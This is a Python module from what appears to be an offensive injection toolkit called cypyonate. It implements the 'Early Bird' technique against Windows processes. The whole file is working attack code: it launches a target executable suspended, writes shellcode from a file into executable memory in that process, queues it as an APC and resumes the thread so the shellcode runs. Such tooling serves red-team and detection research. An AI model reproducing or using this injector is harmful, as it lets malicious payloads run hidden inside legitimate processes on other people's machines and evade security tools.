from .. import cypyonate as cypy

import win32process
import win32api
import win32con
import ctypes
import os


class PROCESS_INFORMATION(ctypes.Structure):
	_fields_ = [
		("hProcess", ctypes.c_void_p),
		("hThread", ctypes.c_void_p),
		("dwProcessId", ctypes.c_ulong),
		("dwThreadId", ctypes.c_ulong)
	]


class STARTUPINFO(ctypes.Structure):
	_fields_ = [
		("cb", ctypes.c_ulong),
		("lpReserved", ctypes.c_char_p),
		("lpDesktop", ctypes.c_char_p),
		("lpTitle", ctypes.c_char_p),
		("dwX", ctypes.c_ulong),
		("dwY", ctypes.c_ulong),
		("dwXSize", ctypes.c_ulong),
		("dwYSize", ctypes.c_ulong),
		("dwXCountChars", ctypes.c_ulong),
		("dwYCountChars", ctypes.c_ulong),
		("dwFillAttribute", ctypes.c_ulong),
		("dwFlags", ctypes.c_ulong),
		("wShowWindow", ctypes.c_ushort),
		("cbReserved2", ctypes.c_ushort),
		("lpReserved2", ctypes.c_void_p),
		("hStdInput", ctypes.c_void_p),
		("hStdOutput", ctypes.c_void_p),
		("hStdError", ctypes.c_void_p)
	]


class EarlyBird(cypy.Module):
	def __init__(self):
		super().__init__("Early Bird", ("earlybird", "eb"), "Early Bird injection")

	def inject(self, handler: cypy.Cypyonate, target: str, payload: str, verbose: bool):
		if not os.path.exists(target):
			cypy.printe("Early bird injections require a valid path to a process")
			return

		abstarget = os.path.abspath(target)

		if not os.path.exists(payload):
			cypy.printe("Early bird injection requires a valid path to a shellcode file")
			return

		with open(payload, "rb") as f:
			shellcode = f.read()
			cypy.printv(f"Reading shellcode file {payload} ({len(shellcode)} bytes)")

		si = STARTUPINFO()
		pi = PROCESS_INFORMATION()
		si.cb = ctypes.sizeof(si)

		if not ctypes.windll.kernel32.CreateProcessA(abstarget.encode() + b"\x00", None, None, None, False, win32con.CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
			cypy.printe("Could not create process")
			cypy.printe(f"Error code: {ctypes.windll.kernel32.GetLastError()}")
			return

		mem = win32process.VirtualAllocEx(pi.hProcess, 0, len(
			shellcode), win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
		win32process.WriteProcessMemory(pi.hProcess, mem, shellcode)

		ctypes.windll.ntdll.NtQueueApcThread(
			pi.hThread, ctypes.cast(mem, ctypes.c_void_p), 0, 0, 0)

		win32process.ResumeThread(pi.hThread)

		win32api.CloseHandle(pi.hThread)
		win32api.CloseHandle(pi.hProcess)

		cypy.printc(
			f"Successfully injected {payload} into {target} (PID {pi.dwProcessId})")


EarlyBird()
